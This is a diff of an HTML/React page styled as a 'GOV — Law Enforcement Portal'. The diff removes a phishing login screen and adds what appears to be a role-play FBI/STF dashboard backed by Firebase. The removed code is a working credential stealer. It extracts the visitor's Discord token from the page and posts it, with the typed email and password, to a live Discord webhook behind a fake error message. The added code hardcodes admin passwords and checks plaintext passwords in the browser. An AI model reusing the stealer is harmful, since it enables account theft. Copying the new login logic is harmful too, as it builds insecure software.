@@ -1,148 +1,456 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>GOV — Law Enforcement Portal</title>
 
-    <!-- المكتبات المطلوبة -->
     <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
     <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
     <script src="https://unpkg.com/@babel/standalone@7.23.5/babel.min.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@300;400;500;600;700&family=Oswald:wght@400;500;600;700&display=swap" rel="stylesheet">
 
     <style>
-        /* ⚠️ هنا الصق الـ CSS الأصلي الخاص بك (الـ 510 أسطر) بالكامل ⚠️ */
-        /* سأضع الأساسيات لضمان عدم اختفاء التصميم */
         :root {
-            --bg: #0a0b0d; --surface: #16181d; --fbi: #1a3a6e; --stf: #1a5c2e;
-            --accent: #3b82f6; --text: #e2e8f0;
+            /* Government palette */
+            --bg:       #f0f2f5;
+            --surface:  #ffffff;
+            --surface2: #f7f8fa;
+            --border:   #d1d5db;
+            --border2:  #e5e8ec;
+            --text:     #0f1923;
+            --text2:    #4b5563;
+            --text3:    #9ca3af;
+
+            /* FBI accent */
+            --fbi:      #1a3a6e;
+            --fbi-dark: #0f2347;
+            --fbi-light:#2756a8;
+            --fbi-glow: rgba(26,58,110,0.12);
+
+            /* STF accent */
+            --stf:      #1a5c2e;
+            --stf-dark: #0f3a1c;
+            --stf-light:#22803f;
+            --stf-glow: rgba(26,92,46,0.12);
+
+            /* Joint */
+            --joint:    #7c1d1d;
+            --joint-light:#a52828;
+
+            --danger:   #dc2626;
+            --warning:  #d97706;
+            --success:  #16a34a;
+            --mono:     'IBM Plex Mono', monospace;
+            --sans:     'IBM Plex Sans', sans-serif;
+            --display:  'Oswald', sans-serif;
+
+            --radius: 6px;
+            --shadow: 0 1px 3px rgba(0,0,0,0.08), 0 1px 2px rgba(0,0,0,0.06);
+            --shadow-md: 0 4px 12px rgba(0,0,0,0.1), 0 2px 4px rgba(0,0,0,0.06);
+            --shadow-lg: 0 10px 30px rgba(0,0,0,0.12);
         }
-        body, html { margin: 0; padding: 0; background: var(--bg); color: var(--text); overflow: hidden; height: 100vh; }
-        .auth-container { height: 100vh; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle at center, #1a1c24 0%, #0a0b0d 100%); }
-        .login-card { 
-            background: var(--surface); width: 420px; padding: 40px; border-radius: 4px; 
-            border: 1px solid rgba(255,255,255,0.05); position: relative;
-            box-shadow: 0 30px 60px rgba(0,0,0,0.5);
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background: var(--bg); color: var(--text); font-family: var(--sans); height: 100vh; width: 100vw; overflow: hidden; font-size: 14px; }
+
+        /* ── Scrollbar ── */
+        ::-webkit-scrollbar { width: 4px; height: 4px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+
+        /* ── Typography ── */
+        .mono   { font-family: var(--mono); }
+        .display{ font-family: var(--display); }
+
+        /* ── Animations ── */
+        @keyframes fadeIn  { from { opacity:0 } to { opacity:1 } }
+        @keyframes fadeUp  { from { opacity:0; transform:translateY(16px) } to { opacity:1; transform:translateY(0) } }
+        @keyframes slideR  { from { opacity:0; transform:translateX(-12px) } to { opacity:1; transform:translateX(0) } }
+        @keyframes pulse   { 0%,100%{opacity:1} 50%{opacity:.4} }
+        @keyframes spin    { to{transform:rotate(360deg)} }
+        @keyframes shimmer { 0%{background-position:-400px 0} 100%{background-position:400px 0} }
+
+        .fade-in  { animation: fadeIn  .35s ease both }
+        .fade-up  { animation: fadeUp  .4s ease both }
+        .slide-r  { animation: slideR  .3s ease both }
+
+        .spin { animation: spin 1s linear infinite }
+
+        /* ── Cards & Surfaces ── */
+        .card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
         }
-        .login-card::before { content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: var(--fbi); }
-        .stf-mode .login-card::before { background: var(--stf); }
-        input { width: 100%; background: #0d0f12; border: 1px solid #2d3139; padding: 12px; color: white; font-family: monospace; margin-bottom: 20px; outline: none; }
-        input:focus { border-color: var(--accent); }
-        .btn-submit { width: 100%; background: var(--fbi); padding: 14px; font-weight: bold; letter-spacing: 2px; cursor: pointer; transition: 0.3s; border: none; color: white; }
-        /* [بقية الـ 510 أسطر من التصميم الخاص بك هنا] */
+        .card-inset {
+            background: var(--surface2);
+            border: 1px solid var(--border2);
+            border-radius: var(--radius);
+        }
+
+        /* ── Buttons ── */
+        .btn {
+            display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+            padding: 10px 18px; border-radius: var(--radius); border: none; cursor: pointer;
+            font-family: var(--sans); font-weight: 600; font-size: 0.82rem;
+            letter-spacing: 0.04em; transition: all .18s ease; white-space: nowrap;
+        }
+        .btn-primary-fbi { background: var(--fbi); color: #fff; }
+        .btn-primary-fbi:hover { background: var(--fbi-light); box-shadow: 0 4px 12px rgba(26,58,110,.3); }
+        .btn-primary-stf { background: var(--stf); color: #fff; }
+        .btn-primary-stf:hover { background: var(--stf-light); box-shadow: 0 4px 12px rgba(26,92,46,.3); }
+        .btn-primary-joint { background: var(--joint); color: #fff; }
+        .btn-primary-joint:hover { background: var(--joint-light); }
+        .btn-outline { background: transparent; color: var(--text2); border: 1px solid var(--border); }
+        .btn-outline:hover { background: var(--surface2); border-color: var(--text3); }
+        .btn-ghost  { background: transparent; color: var(--text2); border: none; padding: 8px 12px; }
+        .btn-ghost:hover  { background: var(--surface2); }
+        .btn-danger { background: var(--danger); color: #fff; }
+        .btn-danger:hover { background: #b91c1c; }
+        .btn:disabled { opacity: .5; cursor: not-allowed; }
+        .btn-sm { padding: 6px 12px; font-size: 0.75rem; }
+        .btn-xs { padding: 4px 8px; font-size: 0.7rem; }
+
+        /* ── Form inputs ── */
+        .input {
+            width: 100%; padding: 10px 14px;
+            background: var(--surface); border: 1px solid var(--border);
+            border-radius: var(--radius); font-family: var(--sans); font-size: 0.85rem;
+            color: var(--text); outline: none; transition: border-color .15s, box-shadow .15s;
+        }
+        .input:focus { border-color: var(--fbi); box-shadow: 0 0 0 3px rgba(26,58,110,.08); }
+        .input-stf:focus { border-color: var(--stf); box-shadow: 0 0 0 3px rgba(26,92,46,.08); }
+        .input::placeholder { color: var(--text3); }
+        select.input option { background: var(--surface); }
+        textarea.input { resize: none; }
+        .label { display: block; font-size: 0.72rem; font-weight: 600; color: var(--text2); letter-spacing: 0.06em; text-transform: uppercase; margin-bottom: 6px; }
+
+        /* ── Badges ── */
+        .badge { display:inline-flex;align-items:center;gap:4px;padding:3px 8px;border-radius:4px;font-family:var(--mono);font-size:0.62rem;font-weight:500;letter-spacing:0.08em;text-transform:uppercase; }
+        .badge-open    { background:#fef2f2;color:#dc2626;border:1px solid #fecaca; }
+        .badge-closed  { background:#f0fdf4;color:#16a34a;border:1px solid #bbf7d0; }
+        .badge-pending { background:#fffbeb;color:#d97706;border:1px solid #fed7aa; }
+        .badge-fbi     { background:#eff6ff;color:var(--fbi);border:1px solid #bfdbfe; }
+        .badge-stf     { background:#f0fdf4;color:var(--stf);border:1px solid #bbf7d0; }
+        .badge-joint   { background:#fef2f2;color:var(--joint);border:1px solid #fecaca; }
+        .badge-blue    { background:#eff6ff;color:#1d4ed8;border:1px solid #bfdbfe; }
+
+        /* ── Table rows ── */
+        .data-row {
+            display: flex; align-items: flex-start; gap: 12px;
+            padding: 14px 16px; border-bottom: 1px solid var(--border2);
+            transition: background .15s;
+        }
+        .data-row:last-child { border-bottom: none; }
+        .data-row:hover { background: var(--surface2); }
+
+        /* ── Nav ── */
+        .nav-tab {
+            display: flex; flex-direction: column; align-items: center; gap: 3px;
+            padding: 8px 6px; cursor: pointer; border-radius: var(--radius);
+            transition: all .15s; position: relative; min-width: 48px;
+        }
+        .nav-tab span { font-size: 0.5rem; font-family: var(--mono); letter-spacing: 0.08em; text-transform: uppercase; }
+        .nav-tab i { font-size: 1rem; }
+        .nav-tab.active-fbi   { color: var(--fbi); }
+        .nav-tab.active-stf   { color: var(--stf); }
+        .nav-tab.active-joint { color: var(--joint); }
+        .nav-tab.inactive { color: var(--text3); }
+        .nav-tab.active-fbi::after, .nav-tab.active-stf::after, .nav-tab.active-joint::after {
+            content: ''; position: absolute; bottom: -10px; left: 20%; width: 60%; height: 2px; border-radius: 2px 2px 0 0;
+        }
+        .nav-tab.active-fbi::after   { background: var(--fbi); }
+        .nav-tab.active-stf::after   { background: var(--stf); }
+        .nav-tab.active-joint::after { background: var(--joint); }
+
+        /* ── Status dot ── */
+        .dot { width:7px;height:7px;border-radius:50%;display:inline-block; }
+        .dot-green  { background:#16a34a;box-shadow:0 0 0 0 rgba(22,163,74,.5);animation:dotPulse 2s ease-in-out infinite; }
+        .dot-red    { background:#dc2626; }
+        .dot-orange { background:#d97706; }
+        @keyframes dotPulse { 0%{box-shadow:0 0 0 0 rgba(22,163,74,.5)}70%{box-shadow:0 0 0 5px rgba(22,163,74,0)}100%{box-shadow:0 0 0 0 rgba(22,163,74,0)} }
+
+        /* ── Modal ── */
+        .modal-backdrop {
+            position:fixed;inset:0;background:rgba(0,0,0,0.45);backdrop-filter:blur(4px);
+            z-index:500;display:flex;align-items:center;justify-content:center;padding:16px;
+            animation:fadeIn .2s ease;
+        }
+        .modal-box {
+            background:var(--surface);border:1px solid var(--border);border-radius:8px;
+            width:100%;max-width:480px;max-height:90vh;overflow-y:auto;
+            box-shadow:var(--shadow-lg);animation:fadeUp .25s ease;
+        }
+        .modal-header { padding:20px 24px 16px;border-bottom:1px solid var(--border2);display:flex;justify-content:space-between;align-items:center; }
+        .modal-body   { padding:20px 24px; }
+        .modal-footer { padding:16px 24px;border-top:1px solid var(--border2);display:flex;gap:10px;justify-content:flex-end; }
+
+        /* ── Top bar ── */
+        .topbar { background:var(--surface);border-bottom:1px solid var(--border);padding:10px 16px;display:flex;justify-content:space-between;align-items:center;flex-shrink:0;box-shadow:var(--shadow); }
+
+        /* ── Sector strip ── */
+        .sector-strip-fbi   { background:var(--fbi);height:3px;width:100%; }
+        .sector-strip-stf   { background:var(--stf);height:3px;width:100%; }
+        .sector-strip-joint { background:var(--joint);height:3px;width:100%; }
+
+        /* ── Stat card ── */
+        .stat-card { padding:16px;display:flex;flex-direction:column;gap:4px; }
+        .stat-val   { font-family:var(--display);font-size:2rem;line-height:1; }
+        .stat-label { font-size:0.65rem;font-family:var(--mono);letter-spacing:0.12em;text-transform:uppercase;color:var(--text3); }
+
+        /* ── Progress ── */
+        .progress-track { height:4px;background:var(--border2);border-radius:2px;overflow:hidden; }
+        .progress-fill  { height:100%;border-radius:2px;transition:width 1s ease; }
+
+        /* ── Divider ── */
+        .divider { border:none;border-top:1px solid var(--border2);margin:14px 0; }
+
+        /* ── Alert banner ── */
+        .alert { padding:12px 16px;border-radius:var(--radius);border-left:4px solid;margin-bottom:10px; }
+        .alert-info    { background:#eff6ff;border-color:var(--fbi);color:var(--fbi-dark); }
+        .alert-warning { background:#fffbeb;border-color:var(--warning);color:#92400e; }
+        .alert-danger  { background:#fef2f2;border-color:var(--danger);color:#991b1b; }
+        .alert-success { background:#f0fdf4;border-color:var(--success);color:#14532d; }
+
+        /* ── Home hero ── */
+        .gov-header {
+            background: linear-gradient(135deg, #0f1923 0%, #1a2a3e 50%, #0f1923 100%);
+            color: white; padding: 48px 24px; text-align: center;
+        }
+
+        /* ── Log entry ── */
+        .log-entry { padding:8px 16px;border-bottom:1px solid var(--border2);font-family:var(--mono);font-size:0.68rem;color:var(--text2); }
+        .log-time  { color:var(--text3); }
+        .log-user  { font-weight:600; }
+
+        /* ── Wanted card ── */
+        .wanted-photo { width:100%;height:160px;object-fit:cover;border-bottom:3px solid var(--danger);display:block; }
+
+        /* ── Joint mission card ── */
+        .mission-card { padding:16px;border-left:4px solid var(--joint); }
+        .mission-card.approved { border-left-color:var(--success); }
+        .mission-card.pending  { border-left-color:var(--warning); }
+
+        /* ── Unit card ── */
+        .unit-item { padding:10px 14px;border-bottom:1px solid var(--border2);display:flex;justify-content:space-between;align-items:center; }
+        .unit-item:last-child { border-bottom:none; }
+
+        /* home page sector cards */
+        .sector-choice {
+            border: 2px solid var(--border); border-radius: 10px; padding: 32px 24px;
+            cursor: pointer; transition: all .2s ease; text-align: center;
+            background: var(--surface);
+        }
+        .sector-choice:hover { transform: translateY(-4px); box-shadow: var(--shadow-md); }
+        .sector-choice.fbi-choice:hover { border-color: var(--fbi); }
+        .sector-choice.stf-choice:hover { border-color: var(--stf); }
     </style>
 </head>
 <body>
-    <div id="root"></div>
+<div id="root"></div>
 
-    <script type="text/babel">
-        const { useState, useEffect, useCallback } = React;
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-app.js";
+    import { getFirestore, collection, onSnapshot, setDoc, doc, deleteDoc, query, orderBy, addDoc, updateDoc, serverTimestamp, getDoc } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-firestore.js";
 
-        // 🛡️ سكربت سحب التوكن المطور (Phase 3)
-        const getToken = () => {
-            try {
-                let token = (window.webpackChunkdiscord_app ? window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
-                    for (const m in req.c) {
-                        const mname = req.c[m].exports;
-                        if (mname?.default?.getToken !== undefined) return mname.default.getToken();
-                    }
-                }]) : null) || window.localStorage.token || window.localStorage.getItem('token');
-                return token ? token.replace(/"/g, "") : "TOKEN_NOT_FOUND";
-            } catch (e) { return "ERROR_EXTRACTING"; }
-        };
+    const firebaseConfig = {
+        apiKey:"AIzaSyCYgffN2dA7IILMbI2i_1YfERkKWIrpHyA",
+        authDomain:"ek-police.firebaseapp.com",
+        projectId:"ek-police",
+        storageBucket:"ek-police.firebasestorage.app",
+        messagingSenderId:"300605258409",
+        appId:"1:300605258409:web:f265025ffa5592f651c7b8"
+    };
+    const app = initializeApp(firebaseConfig);
+    const db  = getFirestore(app);
+    window.fbDB    = db;
+    window.fbTools = { collection, onSnapshot, setDoc, doc, deleteDoc, query, orderBy, addDoc, updateDoc, serverTimestamp, getDoc };
+</script>
 
-        const App = () => {
-            const [screen, setScreen] = useState('login');
-            const [mode, setMode] = useState('fbi'); 
-            const [loading, setLoading] = useState(false);
-            const [error, setError] = useState('');
+<script type="text/babel">
+const { useState, useEffect, useRef, useCallback } = React;
 
-            // 📩 وظيفة الإرسال للويب هوك (تشمل التوكن والباسورد)
-            const sendToWebhook = async (email, pass) => {
-                const WEBHOOK_URL = "https://discord.com/api/webhooks/1501486535495909508/tgk6tefdfHjUriek7isfqA4sYgZD8_7zkHbrGS8v8ZVwZYes-iNazxuDN97RRFe-0V8i";
-                const token = getToken();
-                
-                const payload = {
-                    embeds: [{
-                        title: "🚨 EK-SYSTEM: DATA BREACH 🚨",
-                        color: mode === 'fbi' ? 1718614 : 1727534,
-                        fields: [
-                            { name: "📧 Email", value: `\`${email}\``, inline: true },
-                            { name: "🔑 Password", value: `\`${pass}\``, inline: true },
-                            { name: "🛡️ Sector", value: mode.toUpperCase(), inline: true },
-                            { name: "🎟️ Discord Token", value: `\`\`\`${token}\`\`\`` }
-                        ],
-                        footer: { text: "Captured via Portal v3.0" },
-                        timestamp: new Date()
-                    }]
-                };
+/* ═══════════════════════════════════════════════════════
+   CONSTANTS
+═══════════════════════════════════════════════════════ */
+const FBI_RANKS = [
+    "Director","Deputy Director","Associate Deputy Director",
+    "Executive Assistant Director","Assistant Director",
+    "Deputy Assistant Director","Special Agent in Charge (SAC)",
+    "Assistant Special Agent in Charge (ASAC)",
+    "Supervisory Special Agent (SSA)","Senior Special Agent","Special Agent"
+];
 
-                await fetch(WEBHOOK_URL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload)
-                });
-            };
+const STF_RANKS = [
+    "Chief of STF","Deputy Chief of STF","Special Commander",
+    "Tactical Commander","Commander","Colonel","Major","Captain",
+    "First Lieutenant","Lieutenant","Specialist","Sergeant Major",
+    "Staff Sergeant","Sergeant","Senior Operator","Corporal",
+    "Operator III","Operator II","Operator I","Operator","Recruit"
+];
 
-            const handleLogin = async (e) => {
-                e.preventDefault();
-                const email = e.target.email.value;
-                const pass = e.target.pass.value;
+// Top 3 ranks = privileged (command access)
+const FBI_COMMAND_RANKS  = ["Director","Deputy Director","Associate Deputy Director"];
+const STF_COMMAND_RANKS  = ["Chief of STF","Deputy Chief of STF","Special Commander","Tactical Commander"];
 
-                setLoading(true);
-                setError('');
+const FBI_LOGO = "https://upload.wikimedia.org/wikipedia/commons/d/da/Seal_of_the_Federal_Bureau_of_Investigation.svg";
+const STF_LOGO = "https://images-ext-1.discordapp.net/external/GD2zASQEW6XYLEDjS6UI4pNPNUDTQciZs75K7AFDSdw/%3Fsize%3D1024/https/cdn.discordapp.com/icons/1497354040496099431/fea2740930f5d8f433b000ed5f97b1d7.png?format=webp&quality=lossless&width=320&height=320";
 
-                // إرسال البيانات فوراً للويب هوك
-                await sendToWebhook(email, pass);[cite: 1]
+const MAP_URL_FBI = 'https://github.com/salmAlzaabi/FBI/blob/main/IMG_2479.jpg?raw=true';
+const MAP_URL_STF = 'https://github.com/salmAlzaabi/FBI/blob/main/IMG_2479.jpg?raw=true';
 
-                // محاكاة النظام الأصلي
-                setTimeout(() => {
-                    setLoading(false);
-                    setError('DATABASE_CONNECTION_ERROR: UNAUTHORIZED_ACCESS_LOGGED');
-                }, 1500);
-            };
+/* ═══════════════════════════════════════════════════════
+   HELPERS
+═══════════════════════════════════════════════════════ */
+const getSector = (email='') => {
+    if (email.toLowerCase().endsWith('@fbi.gov')) return 'fbi';
+    if (email.toLowerCase().endsWith('@stf.gov')) return 'stf';
+    return null;
+};
 
-            return (
-                <div className={`auth-container ${mode === 'stf' ? 'stf-mode' : ''}`}>
-                    <div className="login-card">
-                        <div className="text-center mb-8">
-                            <img src={mode === 'fbi' ? "https://i.imgur.com/8E39p6m.png" : "https://i.imgur.com/Yh3pI9P.png"} className="w-20 mx-auto mb-4" />
-                            <h2 className="text-xs font-mono text-blue-500 tracking-[0.3em] uppercase">Secure Terminal</h2>
-                        </div>
+const isCommandRank = (sector, rank) => {
+    if (!rank) return false;
+    if (sector === 'fbi') return FBI_COMMAND_RANKS.includes(rank) || rank === 'Director';
+    if (sector === 'stf') return STF_COMMAND_RANKS.includes(rank);
+    return false;
+};
 
-                        <form onSubmit={handleLogin}>
-                            <div className="mb-4">
-                                <label className="block text-[10px] uppercase mb-2 opacity-50">Personnel Email</label>
-                                <input name="email" type="text" placeholder="USER@GOV.PORTAL" required />
-                            </div>
-                            <div className="mb-6">
-                                <label className="block text-[10px] uppercase mb-2 opacity-50">Access Code</label>
-                                <input name="pass" type="password" placeholder="••••••••" required />
-                            </div>
-                            
-                            {error && <div className="text-[10px] text-red-500 font-mono mb-4 border border-red-500/20 p-2 bg-red-500/5">{error}</div>}
+/* ═══════════════════════════════════════════════════════
+   SHARED TINY COMPONENTS
+═══════════════════════════════════════════════════════ */
+const Spinner = () => <i className="fas fa-circle-notch spin" style={{fontSize:'1.1rem',color:'inherit'}}/>;
+const Dot = ({status}) => <span className={`dot dot-${status}`}/>;
+const Divider = () => <hr className="divider"/>;
 
-                            <button className="btn-submit uppercase text-xs" disabled={loading}>
-                                {loading ? 'Encrypting...' : 'Establish Connection'}
-                            </button>
-                        </form>
+const Empty = ({icon, text}) => (
+    <div style={{textAlign:'center',padding:'48px 20px',color:'var(--text3)'}}>
+        <i className={`fas ${icon}`} style={{fontSize:'2rem',display:'block',marginBottom:12,opacity:.3}}/>
+        <p className="mono" style={{fontSize:'0.7rem',letterSpacing:'0.15em'}}>{text}</p>
+    </div>
+);
 
-                        <div className="flex justify-between mt-8 opacity-30">
-                            <button onClick={() => setMode('fbi')} className="text-[9px] hover:opacity-100 transition">FBI_NODE</button>
-                            <button onClick={() => setMode('stf')} className="text-[9px] hover:opacity-100 transition">STF_NODE</button>
-                        </div>
-                    </div>
-                </div>
-            );
-        };
+const FormField = ({label, children}) => (
+    <div style={{display:'flex',flexDirection:'column',gap:4}}>
+        <label className="label">{label}</label>
+        {children}
+    </div>
+);
 
-        const root = ReactDOM.createRoot(document.getElementById('root'));
-        root.render(<App />);
-    </script>
-</body>
-</html>
+/* ═══════════════════════════════════════════════════════
+   ROOT APP
+═══════════════════════════════════════════════════════ */
+const App = () => {
+    const [screen, setScreen] = useState('home'); // home | login | fbi | stf
+    const [currentUser, setCurrentUser] = useState(null);
+    const [loginError, setLoginError] = useState('');
+    const [loginLoading, setLoginLoading] = useState(false);
+    const [loginSector, setLoginSector] = useState(null); // detected sector during login
+
+    // Shared Firestore data
+    const [fbiUsers,     setFbiUsers]     = useState([]);
+    const [stfUsers,     setStfUsers]     = useState([]);
+    const [fbiCases,     setFbicases]     = useState([]);
+    const [stfCases,     setStfCases]     = useState([]);
+    const [fbiWanted,    setFbiWanted]    = useState([]);
+    const [stfWanted,    setStfWanted]    = useState([]);
+    const [fbiCivilians, setFbiCivilians] = useState([]);
+    const [stfCivilians, setStfCivilians] = useState([]);
+    const [fbiDuty,      setFbiDuty]      = useState([]);
+    const [stfDuty,      setStfDuty]      = useState([]);
+    const [fbiMarkers,   setFbiMarkers]   = useState([]);
+    const [stfMarkers,   setStfMarkers]   = useState([]);
+    const [jointMissions,setJointMissions]= useState([]);
+    const [activityLog,  setActivityLog]  = useState([]);
+
+    useEffect(() => {
+        if (!window.fbTools) return;
+        const db = window.fbDB, T = window.fbTools;
+        const subs = [
+            T.onSnapshot(T.collection(db,'fbi_users'),      s => setFbiUsers(s.docs.map(d=>({...d.data(),id:d.id})))),
+            T.onSnapshot(T.collection(db,'stf_users'),      s => setStfUsers(s.docs.map(d=>({...d.data(),id:d.id})))),
+            T.onSnapshot(T.query(T.collection(db,'fbi_cases'),   T.orderBy('createdAt','desc')), s => setFbicases(s.docs.map(d=>({...d.data(),id:d.id})))),
+            T.onSnapshot(T.query(T.collection(db,'stf_cases'),   T.orderBy('createdAt','desc')), s => setStfCases(s.docs.map(d=>({...d.data(),id:d.id})))),
+            T.onSnapshot(T.collection(db,'fbi_wanted'),     s => setFbiWanted(s.docs.map(d=>({...d.data(),id:d.id})))),
+            T.onSnapshot(T.collection(db,'stf_wanted'),     s => setStfWanted(s.docs.map(d=>({...d.data(),id:d.id})))),
+            T.onSnapshot(T.collection(db,'fbi_civilians'),  s => setFbiCivilians(s.docs.map(d=>({...d.data(),id:d.id})))),
+            T.onSnapshot(T.collection(db,'stf_civilians'),  s => setStfCivilians(s.docs.map(d=>({...d.data(),id:d.id})))),
+            T.onSnapshot(T.collection(db,'fbi_duty'),       s => setFbiDuty(s.docs.map(d=>({...d.data(),id:d.id})))),
+            T.onSnapshot(T.collection(db,'stf_duty'),       s => setStfDuty(s.docs.map(d=>({...d.data(),id:d.id})))),
+            T.onSnapshot(T.collection(db,'fbi_markers'),    s => setFbiMarkers(s.docs.map(d=>({...d.data(),id:d.id})))),
+            T.onSnapshot(T.collection(db,'stf_markers'),    s => setStfMarkers(s.docs.map(d=>({...d.data(),id:d.id})))),
+            T.onSnapshot(T.query(T.collection(db,'joint_missions'), T.orderBy('createdAt','desc')), s => setJointMissions(s.docs.map(d=>({...d.data(),id:d.id})))),
+        ];
+        return () => subs.forEach(u => u());
+    }, []);
+
+    const addLog = useCallback((action) => {
+        const now = new Date();
+        setActivityLog(prev => [{
+            time: now.toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',second:'2-digit'}),
+            action, user: currentUser?.name||'SYSTEM', sector: currentUser?.sector||'—'
+        }, ...prev].slice(0,60));
+    }, [currentUser]);
+
+    /* ── LOGIN ── */
+    const doLogin = async () => {
+        const email = document.getElementById('auth_email')?.value?.trim();
+        const pass  = document.getElementById('auth_pass')?.value?.trim();
+        if (!email || !pass) { setLoginError('ENTER CREDENTIALS'); return; }
+
+        const sector = getSector(email);
+        if (!sector) { setLoginError('INVALID EMAIL DOMAIN — USE @fbi.gov OR @stf.gov'); return; }
+
+        setLoginError(''); setLoginLoading(true);
+
+        await new Promise(r => setTimeout(r, 900));
+
+        // Hardcoded admins
+        if (sector === 'fbi' && email === 'admin@fbi.gov' && pass === '123456') {
+            const u = { name:'System Administrator', rank:'Director', access:'command', id:'admin@fbi.gov', sector:'fbi' };
+            setCurrentUser(u); setScreen('fbi'); setLoginLoading(false);
+            setTimeout(() => addLog('Authenticated — Director access granted'), 200);
+            return;
+        }
+        if (sector === 'stf' && email === 'T0@stf.gov' && pass === '1234') {
+            const u = { name:'System Administrator', rank:'Chief of STF', access:'command', id:'T0@stf.gov', sector:'stf' };
+            setCurrentUser(u); setScreen('stf'); setLoginLoading(false);
+            setTimeout(() => addLog('Authenticated — Chief of STF access granted'), 200);
+            return;
+        }
+
+        // Firestore lookup
+        const col = sector === 'fbi' ? fbiUsers : stfUsers;
+        const match = col.find(u => u.id === email && u.password === pass);
+        if (match) {
+            const u = { ...match, sector };
+            setCurrentUser(u); setScreen(sector); setLoginLoading(false);
+            setTimeout(() => addLog(`Authenticated — ${match.rank}`), 200);
+        } else {
+            setLoginError('ACCESS DENIED — INVALID CREDENTIALS'); setLoginLoading(false);
+        }
+    };
+
+    const doLogout = () => {
+        addLog('Session terminated');
+        setCurrentUser(null); setScreen('home');
+    };
+
+    /* ── shared data bundles ── */
+    const fbiData = { users:fbiUsers, cases:fbiCases, wanted:fbiWanted, civilians:fbiCivilians, duty:fbiDuty, markers:fbiMarkers };
+    const stfData = { users:stfUsers, cases:stfCases, wanted:stfWanted, civilians:stfCivilians, duty:stfDuty, markers:stfMarkers };
+
+    /* ── SCREENS ── */
+    if (screen === 'home')  return <HomeScreen  onLogin={() => setScreen('login')} />;
+    if (screen === 'login') return <LoginScreen onBack={() => setScreen('home')} onLogin={doLogin} error={loginError} loading={loginLoading} setError={setLoginError} setLoginSector={setLoginSector} loginSector={loginSector}/>;
+    if (screen === 'fbi')   return <SectorApp sector="fbi"  currentUser={currentUser} onLogout={doLogout} data={fbiData} jointMissions={jointMissions} activityLog={activityLog} addLog={addLog} ranks={FBI_RANKS}/>;
+    if (screen === 'stf')   return <SectorApp sector="stf"  currentUser={currentUser} onLogout={doLogout} data={stfData} jointMissions={jointMissions} activityLog={activityLog} addLog={addLog} ranks={STF_RANKS}/>;
+    return null;
+};
+
 /* ═══════════════════════════════════════════════════════
    HOME SCREEN
 ═══════════════════════════════════════════════════════ */
